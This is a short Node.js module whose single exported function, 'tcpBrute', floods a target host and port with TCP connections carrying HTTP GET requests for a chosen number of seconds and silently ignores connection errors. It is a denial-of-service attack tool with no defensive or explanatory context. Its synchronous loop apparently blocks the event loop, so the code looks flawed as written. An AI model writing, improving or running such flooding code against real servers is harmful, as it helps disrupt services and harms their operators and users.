const net = require('net');

function tcpBrute(host, port, duration) {
  const end = Date.now() + duration*1000;
  while(Date.now() < end){
    const socket = net.connect({host, port}, ()=>{
      socket.write(`GET / HTTP/1.1\r\nHost: ${host}\r\n\r\n`);
      socket.end();
    });
    socket.on('error',()=>{});
  }
}
module.exports = { tcpBrute };